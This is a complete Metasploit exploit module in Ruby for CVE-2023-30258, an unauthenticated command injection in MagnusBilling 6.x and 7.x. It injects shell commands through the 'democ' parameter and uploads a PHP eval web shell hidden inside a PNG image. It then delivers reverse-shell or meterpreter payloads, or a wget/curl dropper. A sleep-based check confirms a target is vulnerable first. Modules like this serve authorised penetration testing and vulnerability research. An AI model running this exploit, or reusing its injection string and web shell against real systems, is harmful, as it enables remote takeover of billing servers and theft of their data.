##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Format::PhpPayloadPng
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MagnusBilling application unauthenticated Remote Command Execution.',
        'Description' => %q{
          A Command Injection vulnerability in MagnusBilling application 6.x and 7.x allows
          remote attackers to run arbitrary commands via unauthenticated HTTP request.
          A piece of demonstration code is present in `lib/icepay/icepay.php`, with a call to an exec().
          The parameter to exec() includes the GET parameter `democ`, which is controlled by the user and
          not properly sanitised/escaped.
          After successful exploitation, an unauthenticated user is able to execute arbitrary OS commands.
          The commands run with the privileges of the web server process, typically `www-data` or `asterisk`.
          At a minimum, this allows an attacker to compromise the billing system and its database.

          The following MagnusBilling applications are vulnerable:
          - MagnusBilling application version 6 (all versions);
          - MagnusBilling application up to version 7.x without commit 7af21ed620 which fixes this vulnerability;
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Eldstal' # Discovery of the vulnerability

        ],
        'References' => [
          ['CVE', '2023-30258'],
          ['URL', 'https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258'],
          ['URL', 'https://eldstal.se/advisories/230327-magnusbilling.html']
        ],
        'DisclosureDate' => '2023-06-26',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => true,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'curl', 'bourne', 'printf', 'echo'],
              'Linemax' => 2048,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The MagnusBilling endpoint URL', '/mbilling' ]),
      OptString.new('WEBSHELL', [
        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil
      ], conditions: %w[TARGET == 0])
    ])
  end

  def execute_command(cmd, _opts = {})
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'lib', 'icepay', 'icepay.php'),
      'vars_get' =>
        {
          'democ' => "/dev/null;#{cmd};#"
        }
    })
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'lib', 'icepay', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = if datastore['WEBSHELL'].blank?
                       "#{Rex::Text.rand_text_alpha(8..16)}.php"
                     else
                       datastore['WEBSHELL'].to_s
                     end

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)

    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload
    php_payload = "<?php @eval(base64_decode($_POST[\'#{@post_param}\']));?>"
    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')
    return nil if png_webshell.nil?

    # encode webshell data, set write and execute permissions and write to file on the target for execution
    payload = Base64.strict_encode64(png_webshell.to_s)
    cmd = "chmod 755 ./;echo #{payload}|base64 -d > ./#{@webshell_name}"
    execute_command(cmd)
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path)
    })
    # Check if target is a magnusbilling application
    return CheckCode::Unknown('No response received from target.') unless res
    return CheckCode::Safe('Likely not a magnusbilling application.') unless res.code == 200 && res.body =~ /MagnusBilling/i

    # blind command injection using sleep command
    sleep_time = rand(4..8)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    _res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end
    print_status("Elapsed time: #{elapsed_time.round(2)} seconds.")
    return CheckCode::Safe('Command injection test failed.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      res = upload_webshell
      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200
      register_file_for_cleanup(@webshell_name.to_s)
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
